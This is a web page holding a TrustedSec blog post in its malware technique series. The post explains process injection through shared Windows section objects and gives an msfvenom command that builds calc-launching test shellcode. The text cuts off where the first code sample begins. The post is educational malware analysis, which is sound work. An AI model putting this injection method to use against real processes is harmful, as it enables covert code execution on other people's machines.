# https://trustedsec.com/blog/malware-series-process-injection-mapped-sections

<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
  <body class="mx-auto lang-en section-blog type-blog antialiased overscroll-none"><div class="cky-hide cky-overlay"></div><div class="cky-btn-revisit-wrapper cky-revisit-hide cky-revisit-bottom-left" data-cky-tag="revisit-consent" data-tooltip="Consent Preferences" style="background-color: #000000;"><button aria-label="Consent Preferences" class="cky-btn-revisit"><img alt="Revisit consent button" src="https://cdn-cookieyes.com/assets/images/revisit.svg"></button></div><div class="cky-consent-container cky-box-bottom-left" aria-label="We value your privacy" role="region" tabindex="0"><div class="cky-consent-bar" data-cky-tag="notice" style="border-color: #EDF1F4; background-color: #EDF1F4;"><div class="cky-notice"><p class="cky-title" aria-level="1" data-cky-tag="title" role="heading" style="color: #212121;">We value your privacy</p><div class="cky-notice-group"><div class="cky-notice-des" data-cky-tag="description" style="color: #212121;"><p>We use cookies to enhance your browsing experience, serve personalised ads or content, and analyse our traffic. By clicking "Accept All", you consent to our use of cookies.</p></div><div class="cky-notice-btn-wrapper" data-cky-tag="notice-buttons"><button class="cky-btn cky-btn-customize" aria-label="Customise" data-cky-tag="settings-button" style="color: #000000; border-color: #000000; background-color: #EDF1F4;">Customise</button> <button class="cky-btn cky-btn-reject" aria-label="Reject All" data-cky-tag="reject-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Reject All</button> <button class="cky-btn cky-btn-accept" aria-label="Accept All" data-cky-tag="accept-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Accept All</button> </div></div></div></div></div><div class="cky-modal" tabindex="0"><div class="cky-preference-center" data-cky-tag="detail" aria-label="Customise Consent Preferences" aria-modal="true" role="dialog" style="color: #212121; border-color: #EDF1F4; background-color: #EDF1F4;"><div class="cky-preference-header"><span class="cky-preference-title" aria-level="1" data-cky-tag="detail-title" role="heading" style="color: #212121;">Customise Consent Preferences</span> <button aria-label="Close" class="cky-btn-close" data-cky-tag="detail-close"><img alt="Close" src="https://cdn-cookieyes.com/assets/images/close.svg" width="10" height="10"></button></div><div class="cky-preference-body-wrapper"><div class="cky-preference-content-wrapper" data-cky-tag="detail-description" style="color: #212121;"><p>We use cookies to help you navigate efficiently and perform certain functions. You will find detailed information about all cookies under each consent category below.</p><p>The cookies that are categorised as "Necessary" are stored on your browser as they are essential for enabling the basic functionalities of the site. ...&nbsp;<button class="cky-show-desc-btn" data-cky-tag="show-desc-button" aria-label="Show more">Show more</button></p></div><div class="cky-horizontal-separator"></div><div class="cky-accordion-wrapper" data-cky-tag="detail-categories"><div class="cky-accordion" id="ckyDetailCategorynecessary"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategorynecessaryBody" aria-label="Necessary" data-cky-tag="detail-category-title" style="color: #212121;">Necessary</button><span class="cky-always-active" data-cky-tag="always-active">Always Active</span></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Necessary cookies are required to enable the basic features of this site, such as providing secure log-in or adjusting your consent preferences. These cookies do not store any personally identifiable data.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategorynecessaryBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>__cf_bm</div></li><li><div>Duration</div><div>1 hour</div></li><li><div>Description</div><div>This cookie, set by Cloudflare, is used to support Cloudflare Bot Management. </div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>__hssrc</div></li><li><div>Duration</div><div>session</div></li><li><div>Description</div><div>This cookie is set by Hubspot whenever it changes the session cookie. The __hssrc cookie set to 1 indicates that the user has restarted the browser, and if the cookie does not exist, it is assumed to be a new session.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>__hssc</div></li><li><div>Duration</div><div>1 hour</div></li><li><div>Description</div><div>HubSpot sets this cookie to keep track of sessions and to determine if HubSpot should increment the session number and timestamps in the __hstc cookie.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>_cfuvid</div></li><li><div>Duration</div><div>session</div></li><li><div>Description</div><div>Calendly sets this cookie to track users across sessions to optimize user experience by maintaining session consistency and providing personalized services</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryfunctional"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryfunctionalBody" aria-label="Functional" data-cky-tag="detail-category-title" style="color: #212121;">Functional</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchfunctional" aria-label="Enable Functional" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Functional cookies help perform certain functionalities like sharing the content of the website on social media platforms, collecting feedback, and other third-party features.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryfunctionalBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>lidc</div></li><li><div>Duration</div><div>1 day</div></li><li><div>Description</div><div>LinkedIn sets the lidc cookie to facilitate data center selection.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>li_gc</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>Linkedin set this cookie for storing visitor's consent regarding using cookies for non-essential purposes.</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryanalytics"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryanalyticsBody" aria-label="Analytics" data-cky-tag="detail-category-title" style="color: #212121;">Analytics</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchanalytics" aria-label="Enable Analytics" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Analytical cookies are used to understand how visitors interact with the website. These cookies help provide information on metrics such as the number of visitors, bounce rate, traffic source, etc.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryanalyticsBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>_gcl_au</div></li><li><div>Duration</div><div>3 months</div></li><li><div>Description</div><div>Google Tag Manager sets the cookie to experiment advertisement efficiency of websites using their services.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>_ga_*</div></li><li><div>Duration</div><div>1 year 1 month 4 days</div></li><li><div>Description</div><div>Google Analytics sets this cookie to store and count page views.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>_ga</div></li><li><div>Duration</div><div>1 year 1 month 4 days</div></li><li><div>Description</div><div>Google Analytics sets this cookie to calculate visitor, session and campaign data and track site usage for the site's analytics report. The cookie stores information anonymously and assigns a randomly generated number to recognise unique visitors.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>__hstc</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>Hubspot set this main cookie for tracking visitors. It contains the domain, initial timestamp (first visit), last timestamp (last visit), current timestamp (this visit), and session number (increments for each subsequent session).</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>hubspotutk</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>HubSpot sets this cookie to keep track of the visitors to the website. This cookie is passed to HubSpot on form submission and used when deduplicating contacts.</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryperformance"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryperformanceBody" aria-label="Performance" data-cky-tag="detail-category-title" style="color: #212121;">Performance</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchperformance" aria-label="Enable Performance" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Performance cookies are used to understand and analyse the key performance indexes of the website which helps in delivering a better user experience for the visitors.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryperformanceBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>session_id</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>This cookie is used to get or set the session id for the current session.</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryadvertisement"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryadvertisementBody" aria-label="Advertisement" data-cky-tag="detail-category-title" style="color: #212121;">Advertisement</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchadvertisement" aria-label="Enable Advertisement" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Advertisement cookies are used to provide visitors with customised advertisements based on the pages you visited previously and to analyse the effectiveness of the ad campaigns.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryadvertisementBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>sa-user-id</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>StackAdapt sets this cookie as a third party advertising cookie to record information about a user's website activity, such as the pages visited and the locations viewed, to enable us to provide users with interest-based content and personalised advertisements on external websites.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>sa-user-id-v2</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>StackAdapt sets this cookie as a third party advertising cookie to record information about a user's website activity, such as the pages visited and the locations viewed, to enable us to provide users with interest-based content and personalised advertisements on external websites.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>bcookie</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>LinkedIn sets this cookie from LinkedIn share buttons and ad tags to recognize browser IDs.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>IDE</div></li><li><div>Duration</div><div>1 year 24 days</div></li><li><div>Description</div><div>Google DoubleClick IDE cookies store information about how the user uses the website to present them with relevant ads according to the user profile.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>test_cookie</div></li><li><div>Duration</div><div>15 minutes</div></li><li><div>Description</div><div>doubleclick.net sets this cookie to determine if the user's browser supports cookies.</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryother"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryotherBody" aria-label="Uncategorised" data-cky-tag="detail-category-title" style="color: #212121;">Uncategorised</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchother" aria-label="Enable Uncategorised" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Other uncategorised cookies are those that are being analysed and have not been classified into a category as yet.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryotherBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>sa-user-id-v3</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>Description is currently not available.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>calltrk_nearest_tld</div></li><li><div>Duration</div><div>1 year 1 month 4 days</div></li><li><div>Description</div><div>Description is currently not available.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>calltrk_referrer</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>This is a functionality cookie set by the CallRail. This cookie is used to store the referring URL. It helps to accurately attribute the visitor source when displaying a tracking phone number.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>calltrk_landing</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>This is a functionality cookie set by the CallRail. This cookie is used to store the landing page URL. It helps to accurately attribute the visitor source when displaying a tracking phone number.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>frontend_lang</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>No description available.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>libsyn-paywall-s</div></li><li><div>Duration</div><div>1 day</div></li><li><div>Description</div><div>Description is currently not available.</div></li></ul></div></div></div></div></div><div class="cky-footer-wrapper"><span class="cky-footer-shadow" style="background: linear-gradient(180deg, rgba(255, 255, 255, 0) 0%, #EDF1F4 100%);"></span><div class="cky-prefrence-btn-wrapper" data-cky-tag="detail-buttons"><button aria-label="Reject All" class="cky-btn cky-btn-reject" data-cky-tag="detail-reject-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Reject All</button> <button aria-label="Save My Preferences" class="cky-btn cky-btn-preferences" data-cky-tag="detail-save-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Save My Preferences</button> <button aria-label="Accept All" class="cky-btn cky-btn-accept" data-cky-tag="detail-accept-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Accept All</button></div><div data-cky-tag="detail-powered-by" style="padding: 8px 24px; font-size: 12px; font-weight: 400; line-height: 20px; text-align: right; border-radius: 0 0 6px 6px; direction: ltr; display: flex; justify-content: flex-end; align-items: center; color: #293C5B; background-color: #EDEDED;">Powered by <a href="https://www.cookieyes.com/product/cookie-consent/?ref=cypbcyb&amp;utm_source=cookie-banner&amp;utm_medium=powered-by-cookieyes" rel="noopener" style="margin-left:5px;line-height:0" target="_blank"><img alt="Cookieyes logo" src="https://cdn-cookieyes.com/assets/images/poweredbtcky.svg" style="width:78px;height:13px;margin:0" width="78" height="13"></a></div></div></div></div>


	

    

<!-- Global Header -->

<!-- End Global Header -->
		<main id="main" class="main overflow-x-hidden">

			

   



<section class="c-page-header relative bg-code text-white">

    <div class="px-p24 mq768:px-p48 mq1024:px-p56 c-header-wrap v-blog-header">
    <div class="max-w-p1440 mx-auto">
      <div class="flex flex-col mq768:flex-row">
        <div class="flex relative z-20 items-center mq768:w-1/2 order-1 py-p48 mq1024:py-p56 mq768:pr-p64 mq1024:pr-p56">

          <div class="w-full">

            

  
<ul class="mb-p64 mq1024:mb-p80 flex flex-wrap text-white">
                <li class="after:content-['/'] last:after:hidden after:mx-p8"><a class="text-sm hover:underline focus:underline" href="https://trustedsec.com/blog">Blog</a></li>
            <li class="after:content-['/'] last:after:hidden after:mx-p8"><a class="text-sm hover:underline focus:underline" href="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections">Malware Series: Process Injection Mapped Sections</a></li>
     </ul>
                        <div class="mb-p32">

                              <div class="mb-p16">
                  <span class="font-mono text-sm">December 19, 2024</span>
                </div>
              
                                                                <h1 class="text-h1 mq1280:text-title-xl">Malware Series: Process Injection Mapped Sections</h1>
                              
                                        </div>

                          <div class="mb-p16">
                <span class="text-h3 inline-block">
                  Written by
                                                            Scott Nusbaum
                                                      </span>
              </div>
            


            
            
            
            <div class="mt-p64">
                              <span class="c-tag inline-block py-p6 px-p4 border border-gibson rounded-p6 text-gibson text-bd mr-p12 mb-p12 whitespace-nowrap">Malware Analysis</span>
                          </div>
          </div>
        </div>

        <div class="mq768:flex overflow-hidden items-center mq768:justify-end mq768:w-paired-img max-w-p1080 -mx-p24 mq768:mx-none order-2 mq768:absolute inset-y-0 left-paired-img-plus fx" x-data="" x-fx.left.1200="2rem" style="transform: translate3d(-2rem, 0px, 0px); transition-duration: 1.2s;">
          <div class="relative mq768:static mq768:w-full h-full pt-full -mx-p24 mq768:mx-none">
                          <picture class=" w-full"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcessInjectionMappedSections_WebHero.jpg?w=600&amp;h=600&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767063145&amp;s=829020756046045271b7df68129512cd, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcessInjectionMappedSections_WebHero.jpg?w=900&amp;h=900&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767063145&amp;s=8719d1e91c9b94f3c31534627dd64545 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcessInjectionMappedSections_WebHero.jpg?w=600&amp;h=600&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767063145&amp;s=8009c66b68e3f810c351852dbf69ef55, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcessInjectionMappedSections_WebHero.jpg?w=900&amp;h=900&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767063145&amp;s=9c4cc5640fd2e2ee4a1ff7ca7f98457b 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcessInjectionMappedSections_WebHero.jpg?w=320&amp;h=320&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767063145&amp;s=12c6fa348ef0709508cff41c1eddc0ec, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcessInjectionMappedSections_WebHero.jpg?w=480&amp;h=480&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767063145&amp;s=97a415881b00954ef06ba418f78f8138 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcessInjectionMappedSections_WebHero.jpg?w=320&amp;h=320&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767063145&amp;s=2f51a0ebc865847752b4bd9bd865062a, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcessInjectionMappedSections_WebHero.jpg?w=480&amp;h=480&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767063145&amp;s=0f9a19ff6c01679307d149b620454b20 1.5x"><img class="c-img opacity-0 transition-all duration-300 absolute inset-0 object-cover w-full h-full object-center" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcessInjectionMappedSections_WebHero.jpg?w=320&amp;h=320&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767063145&amp;s=2f51a0ebc865847752b4bd9bd865062a" loading="eager" x-data="image({mq1024:{width:600,height:600},DEFAULT:{width:320,height:320}})" :width="getSize()" :height="getSize('height')" alt="" width="600" height="600" style="opacity: 1;"></picture>                      </div>
        </div>
      </div>
    </div>
  </div>

</section>


      
			
						<div class="relative"><section id="contentWell-0" class="c-module relative bg-white text-black py-p64 mq768:py-p96" data-module-num="1" style="z-index: 0;"><div class="px-p24 mq768:px-p48 mq1024:px-p56"><div class="max-w-p1440 mx-auto"><div class="flex flex-col mq1024:flex-row" x-data="{ mobile: ! $breakpoint('mq1024') }" @resize.window="mobile = ! $breakpoint('mq1024')"><div class="mq1024:w-p320 mq1024:pr-p64 grow-0 shrink-0 mq1024:order-1"><div class="pb-p56 border-b mb-p56 mq1024:pb-none mq1024:border-none mq1024:mb-none"><p class="text-xs font-mono mb-p24">Table of contents</p><ul><li class="mb-p16 last:mb-none"><a href="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections#HowWorks" class="text-h3 hover:underline focus:underline">How does it work?</a></li><li class="mb-p16 last:mb-none"><a href="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections#CodeDemo" class="text-h3 hover:underline focus:underline">Code Demonstration in C# and C++</a></li><li class="mb-p16 last:mb-none"><a href="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections#Reversing" class="text-h3 hover:underline focus:underline">Reversing the Executables</a></li></ul></div><div><div class="w-full"><p id="share-label" class="text-xs font-mono mb-p16">Share</p><ul id="share-icons" class="flex items-center" aria-describedby="share-label"><li class="ml-p12"><a href="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections" target="_blank" title="Share URL" data-target="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-share"></use></svg></span><span class="sr-only">Share URL</span></a></li><li class="ml-p12"><a href="mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&amp;body=Malware%20Series%3A%20Process%20Injection%20Mapped%20Sections%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fmalware-series-process-injection-mapped-sections" target="_blank" title="Share via Email" data-target="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-email"></use></svg></span><span class="sr-only">Share via Email</span></a></li><li class="ml-p12"><a href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fmalware-series-process-injection-mapped-sections" target="_blank" title="Share on Facebook" data-target="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-facebook"></use></svg></span><span class="sr-only">Share on Facebook</span></a></li><li class="ml-p12"><a href="http://twitter.com/share?text=Malware%20Series%3A%20Process%20Injection%20Mapped%20Sections%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fmalware-series-process-injection-mapped-sections" title="Share on X" rel="nofollow" data-target="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-twitter"></use></svg></span><span class="sr-only">Share on X</span></a></li><li class="ml-p12"><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fmalware-series-process-injection-mapped-sections&amp;mini=true" target="_blank" title="Share on LinkedIn" data-target="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-linkedin"></use></svg></span><span class="sr-only">Share on LinkedIn</span></a></li></ul></div></div><div><div class="w-full"><p id="share-label" class="text-xs font-mono mb-p16">Share</p><ul id="share-icons" class="flex items-center" aria-describedby="share-label"><li class="ml-p12"><a href="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections" target="_blank" title="Share URL" data-target="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-share"></use></svg></span><span class="sr-only">Share URL</span></a></li><li class="ml-p12"><a href="mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&amp;body=Malware%20Series%3A%20Process%20Injection%20Mapped%20Sections%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fmalware-series-process-injection-mapped-sections" target="_blank" title="Share via Email" data-target="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-email"></use></svg></span><span class="sr-only">Share via Email</span></a></li><li class="ml-p12"><a href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fmalware-series-process-injection-mapped-sections" target="_blank" title="Share on Facebook" data-target="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-facebook"></use></svg></span><span class="sr-only">Share on Facebook</span></a></li><li class="ml-p12"><a href="http://twitter.com/share?text=Malware%20Series%3A%20Process%20Injection%20Mapped%20Sections%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fmalware-series-process-injection-mapped-sections" title="Share on X" rel="nofollow" data-target="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-twitter"></use></svg></span><span class="sr-only">Share on X</span></a></li><li class="ml-p12"><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fmalware-series-process-injection-mapped-sections&amp;mini=true" target="_blank" title="Share on LinkedIn" data-target="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-linkedin"></use></svg></span><span class="sr-only">Share on LinkedIn</span></a></li></ul></div></div></div><div class="w-full mq1024:w-content-well mq1024:order-2 flex-1"><div class="c-content"><p><span>We're back with another post about common malware techniques. This time, we are talking about using shared memory sections to inject and execute code in a remote process. This method of process injection uses Windows Section Objects to create a memory region that can be shared between processes. In the process created by the attacker, a memory section is created with privileges to share with other processes. The shellcode is copied into this memory region, which is mirrored into all processes sharing the view of this memory section. The section is then mapped to the remote processes and a new thread is started in the remote processes to execute the code.</span></p><p class="MsoNormal"><span>We will demonstrate this method in C and C#, like we have in previous posts.</span></p><h2 id="HowWorks">How does it&nbsp;work?</h2><div class="my-p56 flex justify-center text-center"><figure class="inline-block"><picture class=" inline-block"><source type="image/gif" media="(min-width: 64rem)" srcset=""><source type="image/webp" media="(min-width: 64rem)" srcset=""><source type="image/gif" media="(min-width: 48rem)" srcset=""><source type="image/webp" media="(min-width: 48rem)" srcset=""><source type="image/gif" media="(min-width: 20rem)" srcset=""><source type="image/webp" media="(min-width: 20rem)" srcset=""><source type="image/gif" srcset=""><source type="image/webp" srcset=""><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.files.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig1_Nubaum.gif?dm=1734469434" loading="lazy" x-data="image({mq1024:{width:800,height:500},mq768:{width:800,height:500},mq320:{width:800,height:500},DEFAULT:{width:800,height:500}})" :width="getSize()" :height="getSize('height')" alt="" width="800" height="500" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">FIgure 1 – Illustration of the Injection process</figcaption></figure></div><p><span>The main goal of all injection methods is to execute code into the memory space of a remote process. This method uses the Windows API NtCreateSection function. The NtCreateSection will create a section of memory to share between processes. This memory doesn't live in the virtual memory region of the calling application but in the kernel. These memory spaces can be backed by files or pages (actual memory). When an application wants access to this memory area, it needs to create a view. The view is then mapped into the process's virtual memory using its memory management.</span></p><p class="MsoNormal"><span>Depending on the way the memory is set up, the view can allow the process to read, write, or execute the memory view. This technique will create a Section Object (NtCreateSection) backed by memory and shared with other processes. Even though the malicious process created the Section Object, it will need to create a view in order to manipulate it. The view is created with the NtMapViewOfSection api call. The first view created will belong to the malicious process and only needs permissions to read and write to the Section Object, since we will not be executing the shellcode from this process.</span></p><p class="MsoNormal"><span>After the local Section Object is mapped into the malicious process’s memory, we will then map the same Section Object into a remote target process's memory space using the same NtMapViewOfSection call.</span></p><p class="MsoNormal"><span>It is worth noting that the address of the mapped sections will vary depending on the memory layout of each process, so don't expect the addresses to be the same. Instead of providing the handle to the malicious process, we will use OpenProcess Api to get a handle to a remote process. Note this process needs to be one that we have permission to access, i.e., a process owned by the same user.</span></p><p class="MsoNormal"><span>The main difference between the local and remote mapped sections is that the remote section needs to have the read, write, and execute permissions. The write permission depends on the shellcode in use.</span></p><p class="MsoNormal"><span>Metasploit-generated payloads include an obfuscation stub that overwrites itself and needs the write permission or it will crash. Now the hard part is complete, we need to copy the shellcode into the mapped section and execute it.</span></p><p><span>Moving the memory is as easy as using a memcpy to copy it from the local memory. Once the local processes copies the memory into the section, it is mirrored on the remote memory view. The local process then creates a new remote thread and instructs that thread to execute the view memory space.</span></p><h2 id="CodeDemo">Code Demonstration in C# and&nbsp;C++</h2><p><span>The shellcode used in these examples was created using </span><em>msfvenom -f raw -p windows/exec CMD=”c:\\windows\\system32\\calc.exe” -o spawn_calc.x64.sc<span>.</span></em><span> The shellcode was not packed or protected in any way.</span></p><p class="MsoNormal"><span>The first code sample we will be reviewing is written in C. In this example, the program downloads the shellcode from a remote server and then writes it into the shared memory space. For the sake of brevity, we are not including the code for the getShellCode function.</span></p><pre><code data-highlighted="yes" class="hljs language-cpp"><span class="hljs-number">106</span> <span class="hljs-function"><span 